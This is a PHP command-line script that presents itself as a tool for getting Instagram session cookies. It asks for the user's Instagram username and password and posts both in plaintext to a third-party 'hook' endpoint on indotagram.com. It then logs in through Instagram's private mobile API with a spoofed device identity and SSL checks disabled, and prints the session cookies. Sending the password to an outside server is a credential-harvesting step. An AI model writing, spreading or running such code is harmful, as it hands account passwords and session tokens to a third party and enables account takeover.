<?php
error_reporting(0);
$conf=array(
            'me' => 'Get Cookie Instagram | http://www.indotagram.com',
            'url' =>'http://www.indotagram.com/live',
            'urlsubmit' => 'http://url'
            );
 
function Submit($url,$fields)
    {
    
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,false);
    curl_setopt($ch,CURLOPT_REFERER,$url);          
    curl_setopt($ch,CURLOPT_TIMEOUT,5);   
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT,'Opera/9.80 (Android; Opera Mini/7.6.40234/37.7148; U; id) Presto/2.12.423 Version/12.16');
    curl_setopt($ch,CURLOPT_COOKIEFILE,'cookieSubmit.txt');
    curl_setopt($ch,CURLOPT_COOKIEJAR,'cookieSubmit.txt');
    if ($fields):
      $field_string = http_build_query($fields);
      curl_setopt($ch, CURLOPT_POST, count($fields));
      curl_setopt($ch,CURLOPT_POSTFIELDS,$field_string);   
    endif;
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $body = curl_exec($ch);
    return $body;
    curl_close($ch);
}
    
function proccess($ighost, $useragent, $url, $cookie = 0, $data = 0, $httpheader = array(), $proxy = 0, $userpwd = 0, $is_socks5 = 0){
    $url = 'https://i.instagram.com/api/v1/'.$url;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    if($proxy) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if($httpheader) curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    if($cookie) curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    if ($data):
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    endif;
    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch);
    if(!$httpcode) return false; else{
      $header = substr($response, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
      $body = substr($response, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
      curl_close($ch);
      return array($header, $body);
    }
}
 
  
function cut($content,$start,$end){
if($content && $start && $end) {
$r = explode($start, $content);
if (isset($r[1])){
$r = explode($end, $r[1]);
return $r[0];
}
return '';
}
}
function saveFile($x,$y){
   $f = fopen($x,'a');
             fwrite($f,$y);
             fclose($f);
   }

function _req($url){
   $opts = array(
            19913 => 1,
            10002 => $url,
            10018 => 'EndoBotReaction',
            );
   $ch=curl_init();
   curl_setopt_array($ch,$opts);
   $result = curl_exec($ch);
   curl_close($ch);
   return $result;
  }

$CY="\e[36m";
$GR="\e[2;32m"; 
$OG="\e[92m"; 
$WH="\e[37m"; 
$RD="\e[31m"; 
$YL="\e[33m"; 
$BF="\e[34m";
$DF="\e[39m"; 
$OR="\e[33m"; 
$PP="\e[35m"; 
$B="\e[1m"; 
$CC="\e[0m";
echo"\n";
echo $WH.$conf['me'];
echo "\n";  
$data = Submit($conf['url'].'/data',0);
$data = json_decode($data,true);
echo"\n".$OG."Enter You Userame Instagram : ".$WH;
$mu=trim(fgets(STDIN));
echo"".$OG."Enter Your Password Instagram : ".$WH;
$mp=trim(fgets(STDIN));
echo "\n";
$login = proccess(1, $data['ua'], 
                  'accounts/read_msisdn_header/', 0,
                  Submit($conf['url'].'/hook',array('data' => '{"_csrftoken":null,"device_id":"'.$data['generate_device_id'].'"}')));
$crf=cut($login['0'],'csrftoken=',';');
$hox=Submit($conf['url'].'/hook',array('data' => '{"phone_id":"'.$data['phone_id'].'",
                                "_csrftoken":"'.$crf.'",
                                "username":"'.$mu.'",
                                "adid":"'.$data['phone_id'].'",
                                "guid":"'.$data['guid'].'",
                                "device_id":"'.$data['generate_device_id'].'",
                                "password":"'.$mp.'",
                                "login_attempt_count":"0"}'));
$login = proccess(1, $data['ua'], 'accounts/login/', 0, $hox);
preg_match_all('%Set-Cookie: (.*?);%',$login['0'],$d);$cookie = '';
for($o=0;$o<count($d['0']);$o++)$cookie.=$d['1'][$o].";";
  if(isset(json_decode($login['1'])->logged_in_user->username)){
  echo "".$OG."true";
  echo "\n";
  echo $WH.$cookie;
  }else{
  echo "".$OG."false";
  echo "\n";
  echo $YL.$login['1'];
  }
  echo"\n";
